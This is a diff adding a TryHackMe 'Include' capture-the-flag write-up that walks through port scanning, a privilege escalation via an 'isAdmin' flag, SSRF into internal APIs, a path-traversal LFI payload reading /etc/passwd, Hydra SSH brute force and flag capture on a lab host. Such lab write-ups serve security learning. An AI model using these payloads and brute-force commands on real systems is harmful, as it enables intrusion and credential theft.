@@ -1,0 +1,257 @@
+# 📌 TryHackMe Writeup — Include Challenge
+
+## 🧾 Overview
+- Target IP: 10.48.131.44  
+- Objective: Enumerate → Exploit → Gain Access → Capture Flags  
+
+---
+
+## 🔍 Initial Reconnaissance
+
+We start with a full port scan:
+
+```bash
+nmap -sC -sV -p- 10.48.131.44
+```
+
+### 📊 Results
+
+Open ports identified:
+
+- 22 → SSH (OpenSSH 8.2p1)
+- 25 → SMTP (Postfix)
+- 110 → POP3 (Dovecot)
+- 143 → IMAP (Dovecot)
+- 993 → IMAPS
+- 995 → POP3S
+- 4000 → HTTP (Node.js Express)
+- 50000 → HTTP (Apache 2.4.41)
+
+---
+
+## 🌐 Web Enumeration
+
+Two main web applications discovered:
+
+- Port 4000 → Node.js Login Portal  
+- Port 50000 → System Monitoring Portal  
+
+---
+
+## 🔑 Step 1: Default Credentials
+
+A hint on the login page revealed:
+
+```
+guest:guest
+```
+
+Login successful.
+
+---
+
+## 🔎 Step 2: Broken Object Property Level Authorization (BOPLA)
+
+After logging in, endpoints like:
+
+```
+/friend/1
+/friend/2
+```
+
+indicated possible authorization issues.
+
+By modifying request data:
+
+```json
+"isAdmin": true
+```
+
+We escalated privileges.
+
+### 🚨 Vulnerability
+Broken Object Property Level Authorization (BOPLA)
+
+---
+
+## 🔓 Step 3: New Endpoints Unlocked
+
+After privilege escalation:
+
+- /api  
+- /settings  
+
+---
+
+## 🌍 Step 4: SSRF via Update Banner
+
+The Update Banner feature accepts URLs.
+
+Testing with Interactsh:
+
+```bash
+interactsh-client
+```
+
+Result:
+- Received DNS callbacks → SSRF confirmed  
+
+---
+
+## 🧠 Step 5: Internal API Exploitation
+
+### Internal API:
+
+```
+http://127.0.0.1:5000/internal-api
+```
+
+Response:
+
+```json
+{
+  "secretKey": "superSecretKey123",
+  "confidentialInfo": "This is very confidential."
+}
+```
+
+---
+
+### Admin Credentials API:
+
+```
+http://127.0.0.1:5000/getAllAdmins101099991
+```
+
+Using SSRF:
+
+Encoded response:
+
+```
+eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=
+```
+
+Decoded:
+
+```json
+{
+  "ReviewAppUsername": "admin",
+  "ReviewAppPassword": "admin@!!!",
+  "SysMonAppUsername": "administrator",
+  "SysMonAppPassword": "S$9$qk6d#**LQU"
+}
+```
+
+---
+
+## 🔐 Step 6: Login to System Monitoring Portal
+
+Credentials used:
+
+```
+administrator : S$9$qk6d#**LQU
+```
+
+Login successful → First flag obtained.
+
+---
+
+## 🧬 Step 7: Local File Inclusion (LFI)
+
+Vulnerable parameter:
+
+```
+profile.php?img=profile.png
+```
+
+Exploit:
+
+```
+http://10.48.131.44:50000/profile.php?img=....//....//....//....//etc/passwd
+```
+
+### Output:
+- /etc/passwd contents retrieved  
+
+---
+
+### 👀 Users Found:
+
+- joshua  
+- charles  
+
+---
+
+## 🔓 Step 8: SSH Brute Force
+
+Using Hydra:
+
+```bash
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://include.thm
+```
+
+### Valid Credentials:
+
+```
+charles : 123456
+joshua  : 123456
+```
+
+---
+
+## 🖥️ Step 9: SSH Access
+
+```bash
+ssh joshua@10.48.131.44
+```
+
+---
+
+## 🏁 Step 10: Final Flag
+
+```bash
+cd /var/www/html
+ls
+cat 505eb0fb8a9f32853b4d955e1f9123ea.txt
+```
+
+### 🎯 Flag:
+
+```
+THM{505eREDACTED}
+```
+
+---
+
+## ⚠️ Vulnerabilities Summary
+
+- Default Credentials (guest:guest)  
+- BOPLA (Privilege escalation)  
+- SSRF (Banner URL injection)  
+- Sensitive Data Exposure (Internal APIs)  
+- LFI (profile image parameter)  
+- Weak Passwords (SSH brute force)  
+
+---
+
+## 🧠 Key Takeaways
+
+- Always test for privilege escalation after login  
+- SSRF can expose internal services  
+- Internal APIs often leak sensitive data  
+- LFI can lead to credential discovery  
+- Weak passwords are still common  
+
+---
+
+## 🏁 Attack Chain Summary
+
+```
+Recon → Default Creds → BOPLA → SSRF → Internal API → Credential Leak → LFI → SSH → Flag
+```
+
+---
+
+## 📌 Conclusion
+
+This lab demonstrates a full attack chain combining multiple vulnerabilities to achieve system compromise. It highlights the importance of secure API design, input validation, and proper authentication controls.
